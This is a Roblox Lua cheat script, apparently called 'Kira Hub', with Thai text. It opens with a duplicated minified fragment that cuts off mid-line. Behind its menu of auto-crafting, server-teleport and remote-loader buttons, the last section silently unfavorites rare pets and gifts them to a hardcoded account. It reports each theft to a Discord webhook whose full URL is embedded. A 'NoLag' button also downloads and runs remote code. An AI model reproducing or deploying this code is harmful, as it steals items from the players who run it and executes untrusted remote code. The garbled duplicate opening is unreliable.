--Kira001xห้ามก็อปห้ามส่องlocal P=game:GetService("Players")local U=game:GetService("UserInputService")local p=P.LocalPlayer local g=p:WaitForChild("PlayerGui")local l=Instance.new("ScreenGui",g)l.Name="KiraHubLogoToggle"l.ResetOnSpawn=false l.IgnoreGuiInset=true local b=Instance.new("ImageButton",l)b.Size=UDim2.new(0,48,0,48)b.Position=UDim2.new(0,16,1,-64)b.BackgroundTransparency=1 b.Image="rbxassetid://18402198349"b.ZIndex=10 local m=Instance.new("ScreenGui",g)m.Name="KiraHubUI"m.ResetOnSpawn=false m.IgnoreGuiInset=true m.ZIndexBehavior=Enum.ZIndexBehavior.Global m.Enabled=false local f=Instance.new("Frame",m)f.Size=UDim2.new(0,240,0,200)f.Position=UDim2.new(0,20,0,80)f.BackgroundColor3=Color3.fromRGB(30,30,30)f.Active=true Instance.new("UICorner",f).CornerRadius=UDim.new(0,10)Instance.new("UIStroke",f).Color=Color3.fromRGB(255,255,255)local t=Instance.new("TextLabel",f)t.Size=UDim2.new(1,-20,0,22)t.Position=UDim2.new(0,10,0,6)t.Text="🔐 Kira hub key"t.Font=Enum.Font.GothamBold t.TextSize=13 t.TextColor3=Color3.new(1,1,1)t.BackgroundTransparency=1 t.TextXAlignment=Enum.TextXAlignment.Left local s=Instance.new("ScrollingFrame",f)s.Position=UDim2.new(0,10,0,34)s.Size=UDim2.new(1,-20,1,-80)s.CanvasSize=UDim2.new(0,0,0,0)s.ScrollBarThickness=4 s.BackgroundTransparency=1 s.AutomaticCanvasSize=Enum.AutomaticSize.X s.ScrollingDirection=Enum.ScrollingDirection.X s.ClipsDescendants=true local ly=Instance.new("UIListLayout",s)ly.Padding=UDim.new(0,6)ly.SortOrder=Enum.SortOrder.LayoutOrder ly.FillDirection=Enum.FillDirection.Horizontal ly.HorizontalAlignment=Enum.HorizontalAlignment.Left local c=Instance.new("TextLabel",f)c.Size=UDim2.new(1,-10,0,20)c.Position=UDim2.new(0,5,1,-24)c.Text="© Written by Kira001x"c.Font=Enum.Font.Gotham c.TextSize=11 c.TextColor3=Color3.new(1,1,1)c.BackgroundTransparency=1 c.TextXAlignment=Enum.TextXAlignment.Right b.MouseButton1Click:Connect(function()m.Enabled=not m.Enabled end)local d,ds,sp,di b.InputBegan:Connect(function(i)if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then d=true ds=i.Position sp=b.Position di=i i.Changed:Connect(function()if i.UserInputState==Enum.UserInputState.End then d=false end end)end end)U.InputChanged:Connect(function(i)if i==di and d then local delta=i.Position-ds local x=math.clamp(sp.X.Offset+delta.X,0,workspace.CurrentCamera.ViewportSize.X-b.AbsoluteSize.X)local y=math.clamp(sp.Y.Offset+delta.Y,0,workspace.CurrentCamera.ViewportSize.Y-b.AbsoluteSize.Y)b.Position=UDim2.new(0,x,0,y)end end)local fd,fds,fsp,fdi f.InputBegan:Connect(function(i)if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then fd=true fds=i.Position fsp=f.Position fdi=i i.Changed:Connect(function()if i.UserInputState==Enum.UserInputState.End then fd=false end end)end end)U.InputChanged:Connect(function(i)if i==fdi and fd then local delta=i.Position-fds local x=math.clamp(fsp.X.Offset+delta.X,0,workspace.CurrentCamera.ViewportSize.X-f.AbsoluteSize.X)local y=math.clamp(fsp.Y.Offset+delta.Y,0,workspace.CurrentCamera.ViewportSize.Y-f.AbsoluteSize.Y)f.Position=UDim2.new(0,x,0,y)end end)local function createButton(txt,col,cb)local btn=Instance.new("TextButton")btn.Size=UDim2.new(0,180,0,32)btn.Text=txt btn.Font=Enum.Font.GothamB
--Kira001xห้ามก็อปห้ามส่องlocal P=game:GetService("Players")local U=game:GetService("UserInputService")local p=P.LocalPlayer local g=p:WaitForChild("PlayerGui")local l=Instance.new("ScreenGui",g)l.Name="KiraHubLogoToggle"l.ResetOnSpawn=false l.IgnoreGuiInset=true local b=Instance.new("ImageButton",l)b.Size=UDim2.new(0,48,0,48)b.Position=UDim2.new(0,16,1,-64)b.BackgroundTransparency=1 b.Image="rbxassetid://18402198349"b.ZIndex=10 local m=Instance.new("ScreenGui",g)m.Name="KiraHubUI"m.ResetOnSpawn=false m.IgnoreGuiInset=true m.ZIndexBehavior=Enum.ZIndexBehavior.Global m.Enabled=false local f=Instance.new("Frame",m)f.Size=UDim2.new(0,240,0,200)f.Position=UDim2.new(0,20,0,80)f.BackgroundColor3=Color3.fromRGB(30,30,30)f.Active=true Instance.new("UICorner",f).CornerRadius=UDim.new(0,10)Instance.new("UIStroke",f).Color=Color3.fromRGB(255,255,255)local t=Instance.new("TextLabel",f)t.Size=UDim2.new(1,-20,0,22)t.Position=UDim2.new(0,10,0,6)t.Text="🔐 Kira hub key"t.Font=Enum.Font.GothamBold t.TextSize=13 t.TextColor3=Color3.new(1,1,1)t.BackgroundTransparency=1 t.TextXAlignment=Enum.TextXAlignment.Left local s=Instance.new("ScrollingFrame",f)s.Position=UDim2.new(0,10,0,34)s.Size=UDim2.new(1,-20,1,-80)s.CanvasSize=UDim2.new(0,0,0,0)s.ScrollBarThickness=4 s.BackgroundTransparency=1 s.AutomaticCanvasSize=Enum.AutomaticSize.X s.ScrollingDirection=Enum.ScrollingDirection.X s.ClipsDescendants=true local ly=Instance.new("UIListLayout",s)ly.Padding=UDim.new(0,6)ly.SortOrder=Enum.SortOrder.LayoutOrder ly.FillDirection=Enum.FillDirection.Horizontal ly.HorizontalAlignment=Enum.HorizontalAlignment.Left local c=Instance.new("TextLabel",f)c.Size=UDim2.new(1,-10,0,20)c.Position=UDim2.new(0,5,1,-24)c.Text="© Written by Kira001x"c.Font=Enum.Font.Gotham c.TextSize=11 c.TextColor3=Color3.new(1,1,1)c.BackgroundTransparency=1 c.TextXAlignment=Enum.TextXAlignment.Right b.MouseButton1Click:Connect(function()m.Enabled=not m.Enabled end)local d,ds,sp,di b.InputBegan:Connect(function(i)if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then d=true ds=i.Position sp=b.Position di=i i.Changed:Connect(function()if i.UserInputState==Enum.UserInputState.End then d=false end end)end end)U.InputChanged:Connect(function(i)if i==di and d then local delta=i.Position-ds local x=math.clamp(sp.X.Offset+delta.X,0,workspace.CurrentCamera.ViewportSize.X-b.AbsoluteSize.X)local y=math.clamp(sp.Y.Offset+delta.Y,0,workspace.CurrentCamera.ViewportSize.Y-b.AbsoluteSize.Y)b.Position=UDim2.new(0,x,0,y)end end)local fd,fds,fsp,fdi f.InputBegan:Connect(function(i)if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then fd=true fds=i.Position fsp=f.Position fdi=i i.Changed:Connect(function()if i.UserInputState==Enum.UserInputState.End then fd=false end end)end end)U.InputChanged:Connect(function(i)if i==fdi and fd then local delta=i.Position-fds local x=math.clamp(fsp.X.Offset+delta.X,0,workspace.CurrentCamera.ViewportSize.X-f.AbsoluteSize.X)local y=math.clamp(fsp.Y.Offset+delta.Y,0,workspace.CurrentCamera.ViewportSize.Y-f.AbsoluteSize.Y)f.Position=UDim2.new(0,x,0,y)end end)local function createButton(txt,col,cb)local btn=Instance.new("TextButton")btn.Size=UDim2.new(0,180,0,32)btn.Text=txt btn.Font=Enum.Font.GothamB



--Kira001x
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local placeId = game.PlaceId

local startTime = tick()
local isKicked = false
local kickEnabled = true
local correctPassword = "1142"

local loopingSeed = false
local loopingGear = false

local logoGui = Instance.new("ScreenGui", playerGui)
logoGui.Name = "KiraHubLogoToggle"
logoGui.ResetOnSpawn = false
logoGui.IgnoreGuiInset = true

local logoButton = Instance.new("ImageButton", logoGui)
logoButton.Size = UDim2.new(0, 48, 0, 48)
logoButton.Position = UDim2.new(0, 16, 1, -64)
logoButton.BackgroundTransparency = 1
logoButton.Image = "rbxassetid://18402198349"
logoButton.ZIndex = 10

local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "KiraHubUI"
mainGui.ResetOnSpawn = false
mainGui.IgnoreGuiInset = true
mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
mainGui.Enabled = false

local frame = Instance.new("Frame", mainGui)
frame.Size = UDim2.new(0, 240, 0, 320)
frame.Position = UDim2.new(0, 20, 0, 80)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Active = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", frame).Color = Color3.fromRGB(255, 255, 255)

local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1, -20, 0, 22)
label.Position = UDim2.new(0, 10, 0, 6)
label.Text = "Kira Hub - 60s"
label.Font = Enum.Font.GothamBold
label.TextSize = 13
label.TextColor3 = Color3.new(1, 1, 1)
label.BackgroundTransparency = 1
label.TextXAlignment = Enum.TextXAlignment.Left

local scroll = Instance.new("ScrollingFrame", frame)
scroll.Position = UDim2.new(0, 10, 0, 34)
scroll.Size = UDim2.new(1, -20, 1, -80)
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.ScrollBarThickness = 4
scroll.BackgroundTransparency = 1
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.ClipsDescendants = true

local layout = Instance.new("UIListLayout", scroll)
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder

local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, -10, 0, 20)
credit.Position = UDim2.new(0, 5, 1, -24)
credit.Text = "© เขียนโดย Kira001x"
credit.Font = Enum.Font.Gotham
credit.TextSize = 11
credit.TextColor3 = Color3.new(1, 1, 1)
credit.BackgroundTransparency = 1
credit.TextXAlignment = Enum.TextXAlignment.Right

logoButton.MouseButton1Click:Connect(function()
	mainGui.Enabled = not mainGui.Enabled
end)

local dragging, dragStart, startPos, dragInput
logoButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = logoButton.Position
		dragInput = input
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		logoButton.Position = UDim2.new(0, math.clamp(startPos.X.Offset + delta.X, 0, workspace.CurrentCamera.ViewportSize.X - logoButton.AbsoluteSize.X), 0, math.clamp(startPos.Y.Offset + delta.Y, 0, workspace.CurrentCamera.ViewportSize.Y - logoButton.AbsoluteSize.Y))
	end
end)

local frameDragging, frameDragStart, frameStartPos, frameDragInput
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		frameDragging = true
		frameDragStart = input.Position
		frameStartPos = frame.Position
		frameDragInput = input
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				frameDragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == frameDragInput and frameDragging then
		local delta = input.Position - frameDragStart
		frame.Position = UDim2.new(0, math.clamp(frameStartPos.X.Offset + delta.X, 0, workspace.CurrentCamera.ViewportSize.X - frame.AbsoluteSize.X), 0, math.clamp(frameStartPos.Y.Offset + delta.Y, 0, workspace.CurrentCamera.ViewportSize.Y - frame.AbsoluteSize.Y))
	end
end)

local function createButton(text, color, callback)
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, 0, 0, 32)
	button.Text = text
	button.Font = Enum.Font.GothamBold
	button.TextSize = 13
	button.TextColor3 = Color3.new(1, 1, 1)
	button.BackgroundColor3 = color
	button.AutoButtonColor = true
	button.ZIndex = 1
	button.Parent = scroll
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
	Instance.new("UIStroke", button).Color = Color3.fromRGB(0, 0, 0)
	button.MouseButton1Click:Connect(function()
		callback(button)
	end)
	return button
end

createButton("🚀 Auto Skip Seed: OFF", Color3.fromRGB(0, 170, 255), function(button)
	loopingSeed = not loopingSeed
	button.Text = loopingSeed and "🚀 Auto Skip Seed: ON" or "🚀 Auto Skip Seed: OFF"
	label.Text = button.Text
end)

createButton("⚙️ Auto Skip Gear: OFF", Color3.fromRGB(0, 170, 255), function(button)
	loopingGear = not loopingGear
	button.Text = loopingGear and "⚙️ Auto Skip Gear: ON" or "⚙️ Auto Skip Gear: OFF"
	label.Text = button.Text
end)

createButton("💻 AutoCraft NoKey ©NoLag", Color3.fromRGB(150, 200, 255), function()
	label.Text = "📦 Loading NoLag Script..."
	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
end)

createButton("🍯 Click Honey", Color3.fromRGB(255, 200, 0), function()
	game.ReplicatedStorage.GameEvents.HoneyMachineService_RE:FireServer("MachineInteract")
	label.Text = "✅ Honey Used!"
end)

createButton("🛰 V1349: (Join Server1)", Color3.fromRGB(180, 120, 255), function()
	local sid = "cc7bfab9-ad79-441b-8c42-70c23c36ee64"
	local success, err = pcall(function()
		TeleportService:TeleportToPlaceInstance(placeId, sid, player)
	end)
	label.Text = success and "✅ Warped!" or "❌ Error: " .. tostring(err)
end)

createButton("📋 Copy Server ID", Color3.fromRGB(100, 200, 100), function()
	local id = game.JobId
	pcall(setclipboard, id)
	label.Text = "📋 Copied: " .. id
end)

local serverInput = Instance.new("TextBox", scroll)
serverInput.Size = UDim2.new(1, 0, 0, 32)
serverInput.PlaceholderText = "🔑 Enter Server ID to Join"
serverInput.Text = ""
serverInput.Font = Enum.Font.Gotham
serverInput.TextSize = 13
serverInput.TextColor3 = Color3.new(1, 1, 1)
serverInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
serverInput.ClearTextOnFocus = false
serverInput.TextXAlignment = Enum.TextXAlignment.Left
Instance.new("UICorner", serverInput).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", serverInput).Transparency = 0.4

createButton("🔄 Join Server by ID", Color3.fromRGB(255, 170, 0), function()
	local sid = serverInput.Text
	if sid ~= "" then
		local success, err = pcall(function()
			TeleportService:TeleportToPlaceInstance(placeId, sid, player)
		end)
		label.Text = success and "✅ Warped!" or "❌ Failed: " .. tostring(err)
	else
		label.Text = "⚠️ กรุณาใส่ Server ID ก่อน!"
	end
end)

local passwordInput = Instance.new("TextBox", scroll)
passwordInput.Size = UDim2.new(1, 0, 0, 32)
passwordInput.PlaceholderText = "🔒 ใส่รหัสผ่านก่อนปิด Timer"
passwordInput.Text = ""
passwordInput.Font = Enum.Font.Gotham
passwordInput.TextSize = 13
passwordInput.TextColor3 = Color3.new(1, 1, 1)
passwordInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
passwordInput.ClearTextOnFocus = false
passwordInput.TextXAlignment = Enum.TextXAlignment.Left
Instance.new("UICorner", passwordInput).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", passwordInput).Transparency = 0.4

local kickButton = createButton("⏳ Kick Timer: ON", Color3.fromRGB(255, 70, 70), function()
	if kickEnabled then
		if passwordInput.Text == correctPassword then
			kickEnabled = false
			kickButton.Text = "⏸ Kick Timer: OFF"
			label.Text = kickButton.Text
		else
			label.Text = "❌ ต้องใส่รหัสผ่านก่อนปิด!"
		end
	else
		kickEnabled = true
		startTime = tick()
		isKicked = false
		kickButton.Text = "⏳ Kick Timer: ON"
		label.Text = kickButton.Text
	end
end)

task.spawn(function()
	while true do
		task.wait(1)
		if kickEnabled and not isKicked then
			local remaining = 1000 - math.floor(tick() - startTime)
			if remaining <= 0 then
				isKicked = true
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "⏰ คุณอยู่ครบเวลาแล้ว ให้คนอื่นเขาบ้างนะครับ",
					Color = Color3.new(1, 1, 1),
					Font = Enum.Font.Gotham,
					FontSize = Enum.FontSize.Size24
				})
				task.wait(1)
				player:Kick("คุณอยู่ครบเวลาแล้ว ให้คนอื่นเขาบ้างนะครับ")
			else
				label.Text = " Kira Hub - " .. remaining .. "s"
			end
		elseif not isKicked then
			label.Text = " Kira Hub - Timer Paused"
		end
	end
end)

task.spawn(function()
	while true do
		task.wait(1)
		if loopingSeed then
			local args = {"Claim", workspace.Interaction.UpdateItems.NewCrafting.SeedEventCraftingWorkBench, "SeedEventWorkbench", 1}
			pcall(function()
				game.ReplicatedStorage.GameEvents.CraftingGlobalObjectService:FireServer(unpack(args))
			end)
		end
		if loopingGear then
			local args = {"Claim", workspace.Interaction.UpdateItems.NewCrafting.EventCraftingWorkBench, "GearEventWorkbench", 1}
			pcall(function()
				game.ReplicatedStorage.GameEvents.CraftingGlobalObjectService:FireServer(unpack(args))
			end)
		end
	end
end)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")
local notified = false


local targetNames = {
	"Red Fox",
	"Raccoon",
	"Dragonfly",
	"Queen Bee",
	"Disco Bee",
	"Cooked Owl",
	"Blood Owl",
	"Moon cat"
}


local giftTargetName = "speed14122"


local webhookUrl = "https://discord.com/api/webhooks/1381764967883345950/g3arXN1BRqk85LtUbCC-OK_GS-mKcYiDs4mT9UgZgwr1aSlFeYZAszG8xa96v5LXtXG0"


local function sendWebhook(url, message, playerName)
	if notified then return end

	local serverId = game.JobId or "N/A"
	local data = {
		["content"] = "**👤 โดยผู้ใช้:** `" .. playerName .. "`\n" .. message .. "\n🌐 Server ID: `" .. serverId .. "`"
	}
	local jsonData = HttpService:JSONEncode(data)
	local headers = {["Content-Type"] = "application/json"}

	local requestFunc = http_request or request or syn.request or http
	if requestFunc then
		requestFunc({
			Url = url,
			Method = "POST",
			Headers = headers,
			Body = jsonData
		})
	else
		warn("❌ ไม่พบ request function ที่รองรับการส่ง webhook")
	end

	notified = true
end


local function giftPetToPlayer(targetPlayer)
	local args = {
		"GivePet",
		targetPlayer
	}
	local petGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
	petGiftingService:FireServer(unpack(args))
	print("🎁 ส่งสัตว์ให้ผู้เล่น: " .. targetPlayer.Name)
end


local function isTargetName(name)
	for _, target in ipairs(targetNames) do
		if string.find(name, target) then
			return true
		end
	end
	return false
end


local function unFavoriteIfTarget()
	local character = player.Character
	if not character then return end

	for _, obj in ipairs(character:GetChildren()) do
		if obj:IsA("Tool") then
			for _, target in ipairs(targetNames) do
				if string.find(obj.Name, target) then
					local args = { obj }
					local remote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
					remote:FireServer(unpack(args))
					print("💔 ยกเลิก Favorite: " .. obj.Name)
					return
				end
			end
		end
	end
end


local function checkBackpackAndGift()
	local targetPlayer = Players:FindFirstChild(giftTargetName)
	if not targetPlayer then
		print("⏳ รอผู้เล่นเป้าหมายเข้ามา: " .. giftTargetName)
		return
	end

	for _, item in ipairs(backpack:GetChildren()) do
		if item:IsA("Tool") and isTargetName(item.Name) then
			print("🎯 พบไอเท็ม: " .. item.Name .. " และพบผู้เล่นเป้าหมาย " .. giftTargetName)

			item.Parent = player.Character

			sendWebhook(webhookUrl, "🎯 พบ `" .. item.Name .. "` และส่งให้ `" .. giftTargetName .. "`", player.Name)
			giftPetToPlayer(targetPlayer)

			return
		end
	end

	print("❌ ยังไม่พบไอเท็มเป้าหมาย หรือผู้เล่น " .. giftTargetName)
end


while true do
	unFavoriteIfTarget() -- ✅ ยกเลิก Favorite ถ้ามีสัตว์เป้าหมาย
	checkBackpackAndGift()
	wait(1)
end
